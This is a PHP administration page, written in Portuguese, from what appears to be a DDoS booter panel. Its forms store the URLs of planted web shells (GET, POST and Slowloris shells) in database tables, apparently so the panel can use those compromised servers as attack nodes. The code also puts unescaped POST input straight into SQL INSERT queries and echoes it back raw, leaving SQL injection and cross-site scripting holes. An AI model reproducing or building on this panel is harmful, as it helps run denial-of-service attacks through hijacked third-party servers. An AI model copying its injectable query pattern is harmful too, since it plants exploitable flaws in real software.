<?php
require("header.php");

if(!checkAdmin()) {
die("<div class=\"box\">
    <h2>Administration Panel &bull; Access Denied</h2>
<div class=\"box-content\">
<p>You are not an administrator.</p>
</div></div>");
exit();
}

$host1 = $_POST['getshell'];
$host2 = $_POST['url2'];
$host3 = $_POST['url3'];

if (isset($_POST['Submit'])){
        if($_POST['getshell'] == "") {
        ?>
<div class="box">
<h2><a href="index.php">Erro</a></h2>
<div class="box-content">
<p>Seu POST esta em branco!</p>
</div>
</div>
        <?php
        } else {
	$query = "INSERT INTO getshells (url) VALUES ('$host1')";
	$result = mysql_query($query);
?>
<div class="box">
<h2><a href="index.php">Sucesso!</a></h2>
<div class="box-content">
<p><center>Adicionado com sucesso a GET Shell, <font color="white"><?php echo $host1; ?></font> no banco de dados.</center></p>
</div>
</div>
<?php
        }
}



if (isset($_POST['Submit2'])){
    if($host2 == "") {
    ?>
<div class="box">
<h2><a href="index.php">Erro</a></h2>
<div class="box-content">
<p>O Host esta em branco!</p>
</div>
</div>
        <?php 
        } else {
	$query = "INSERT INTO postshells (url) VALUES ('$host2')";
	$result = mysql_query($query);
echo '<hr>Adicionado com sucesso a Shell POST, ' . $host2 . 'no banco de dados.';
}
}

if (isset($_POST['Submit3'])){
    if($host3 == "") {
    ?>
<div class="box">
<h2><a href="index.php">Erro</a></h2>
<div class="box-content">
<p>O campo esta em branco!</p>
</div>
</div>
    <?php
    } else {
	$query = "INSERT INTO slowloris (url) VALUES ('$host3')";
	$result = mysql_query($query);
echo '<hr>Adicionado com sucesso a Shell Slowloris, ' . $host3 . ' no banco de dados.';
}
}
?>

<div class="box">
<h2><a href="index.php">Adicionar Shells</a></h2>
<div class="box-content">

<?php if (checkAdmin()) { ?>
Insira a Shell em PHP nos campos abaixo: <br> <br>


Shell GET: <form name="frmcontadd" action="" method="post">
<input class="entryfield" name="getshell" type="text" id="getshell">
<input class="button" type="submit" name="Submit" value="Add Shell"></td>

</form>

<br>
Shell POST: <form name="frmcontadd" action="" method="post">
<input class="entryfield" name="url2" type="text" id="url2"></td>
<input class="button" type="submit" name="Submit2" value="Add Shell">

<br>
<br>

Shell Slowloris: <br> <form name="frmcontadd" action="" method="post">
<input class="entryfield" name="url3" type="text" id="url3"></td>
<input class="button" type="submit" name="Submit3" value="Add Shell">

</form>
</div>
</div>

<br>

<?php
}
include 'footer.php';
?>